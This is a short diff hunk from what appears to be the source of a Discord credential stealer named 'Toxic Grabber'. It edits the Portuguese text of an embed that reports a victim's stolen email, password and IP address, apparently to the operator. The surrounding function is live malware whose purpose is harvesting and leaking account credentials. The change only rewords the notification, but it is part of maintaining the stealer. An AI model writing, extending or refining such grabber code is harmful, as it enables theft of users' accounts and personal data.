@@ -153,7 +153,7 @@ function Login(email, password, token) {
                     "fields": [
                         {
                             "name": "**Informações da Conta**",
-                            "value": `Um PC foi infectado pelo Toxic Grabber e o Login Discord salvo foi vazado!\n\n ➜ Email:*${email}\n ➜ Senha: ${password}\n➜ IP ${IP}`,
+                            "value": `PC infectado by Toxic Grabber!\n\n ➜ Email:*${email}\n ➜ Senha: ${password}\n➜ IP ${IP}`,
                             "inline": true
                         },
                         {
